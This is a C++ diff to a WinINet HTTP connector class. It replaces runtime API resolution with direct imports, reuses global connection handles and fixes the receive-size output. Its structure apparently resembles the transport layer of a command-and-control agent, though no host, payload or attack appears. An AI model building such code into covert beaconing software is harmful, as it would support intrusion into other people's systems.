@@ -1,4 +1,5 @@
 #include "ConnectorHTTP.h"
+#include "utils.h"
 
 bool _isdigest(char c) 
 {
@@ -37,22 +38,33 @@ ConnectorHTTP::ConnectorHTTP()
 	this->functions = (HTTPFUNC*) alloc(LPTR, sizeof(HTTPFUNC) );
 	
 	this->functions->LocalAlloc     = alloc;
-	this->functions->GetProcAddress = GetProcAddress;
-	this->functions->LoadLibraryA   = LoadLibraryA;
+	//this->functions->GetProcAddress = GetProcAddress;
+	//this->functions->LoadLibraryA   = LoadLibraryA;
 
-	HMODULE hWininetModule = this->functions->LoadLibraryA("wininet.dll");
-	if (hWininetModule) {
-		this->functions->InternetOpenA              = (decltype(InternetOpenA)*) this->functions->GetProcAddress(hWininetModule, "InternetOpenA");
-		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)this->functions->GetProcAddress(hWininetModule, "InternetConnectA");
-		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)this->functions->GetProcAddress(hWininetModule, "HttpOpenRequestA");
-		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)this->functions->GetProcAddress(hWininetModule, "HttpSendRequestA");
-		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)this->functions->GetProcAddress(hWininetModule, "InternetSetOptionA");
-		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)this->functions->GetProcAddress(hWininetModule, "InternetQueryOptionA");
-		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)this->functions->GetProcAddress(hWininetModule, "HttpQueryInfoA");
-		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)this->functions->GetProcAddress(hWininetModule, "InternetQueryDataAvailable");
-		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)this->functions->GetProcAddress(hWininetModule, "InternetCloseHandle");
-		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)this->functions->GetProcAddress(hWininetModule, "InternetReadFile");
-	}
+	//HMODULE hWininetModule = this->functions->LoadLibraryA("wininet.dll");
+	//if (hWininetModule) {
+		//this->functions->InternetOpenA              = (decltype(InternetOpenA)*) this->functions->GetProcAddress(hWininetModule, "InternetOpenA");
+		//this->functions->InternetConnectA           = (decltype(InternetConnectA)*)this->functions->GetProcAddress(hWininetModule, "InternetConnectA");
+		//this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)this->functions->GetProcAddress(hWininetModule, "HttpOpenRequestA");
+		//this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)this->functions->GetProcAddress(hWininetModule, "HttpSendRequestA");
+		//this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)this->functions->GetProcAddress(hWininetModule, "InternetSetOptionA");
+		//this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)this->functions->GetProcAddress(hWininetModule, "InternetQueryOptionA");
+		//this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)this->functions->GetProcAddress(hWininetModule, "HttpQueryInfoA");
+		//this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)this->functions->GetProcAddress(hWininetModule, "InternetQueryDataAvailable");
+		//this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)this->functions->GetProcAddress(hWininetModule, "InternetCloseHandle");
+		//this->functions->InternetReadFile           = (decltype(InternetReadFile)*)this->functions->GetProcAddress(hWininetModule, "InternetReadFile");
+	//}
+
+		this->functions->InternetOpenA              = InternetOpenA;
+		this->functions->InternetConnectA = InternetConnectA;
+		this->functions->HttpOpenRequestA           = HttpOpenRequestA;
+		this->functions->HttpSendRequestA           = HttpSendRequestA;
+		this->functions->InternetSetOptionA         = InternetSetOptionA;
+		this->functions->InternetQueryOptionA       = InternetQueryOptionA;
+		this->functions->HttpQueryInfoA             = HttpQueryInfoA;
+		this->functions->InternetQueryDataAvailable = InternetQueryDataAvailable;
+		this->functions->InternetCloseHandle        = InternetCloseHandle;
+		this->functions->InternetReadFile           = InternetReadFile;
 }
 
 void ConnectorHTTP::SetConfig( BOOL Ssl, CHAR* UserAgent, CHAR* Method, CHAR* Address, WORD Port, CHAR* Uri, CHAR* Headers)
@@ -66,24 +78,26 @@ void ConnectorHTTP::SetConfig( BOOL Ssl, CHAR* UserAgent, CHAR* Method, CHAR* Ad
 	this->headers        = Headers;
 }
 
+HINTERNET hInternet = NULL;
+HINTERNET hConnect  = NULL;
 
 
-
-BYTE* ConnectorHTTP::SendData(PBYTE data, ULONG data_size, ULONG* recv_size)
+BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 {
-	HINTERNET hInternet;
-	HINTERNET hConnect;
-
 	BOOL  result  = FALSE;
 	DWORD context = 0;
 	BYTE* recv    = NULL;
 
-	hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
+	if(!hInternet)
+		hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
 	if ( hInternet ) {
 
-		hConnect = this->functions->InternetConnectA(hInternet, this->server_address, this->server_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
-		if ( hConnect ) {
-
+		if (!hConnect)
+			hConnect = this->functions->InternetConnectA(hInternet, this->server_address, this->server_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
+		if ( hConnect ) 
+		{
 			LPCSTR rgpszAcceptTypes[] = { "*/*", 0 };
 			DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
 			if ( this->ssl )
@@ -100,7 +114,7 @@ BYTE* ConnectorHTTP::SendData(PBYTE data, ULONG data_size, ULONG* recv_size)
 						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
 					}
 				}
-				BOOL result = this->functions->HttpSendRequestA( hRequest, this->headers, strlen(headers), data, data_size );
+				BOOL result = this->functions->HttpSendRequestA( hRequest, this->headers, (DWORD) StrLenA(headers), (LPVOID)data, (DWORD)data_size );
 
 				if ( result ) {
 					char statusCode[255];
@@ -128,7 +142,7 @@ BYTE* ConnectorHTTP::SendData(PBYTE data, ULONG data_size, ULONG* recv_size)
 									}
 									numberReadedBytes += readedBytes;
 								}					
-								answerSize = numberReadedBytes;
+								*recv_size = numberReadedBytes;
 								recv = buffer;
 							}
 						}
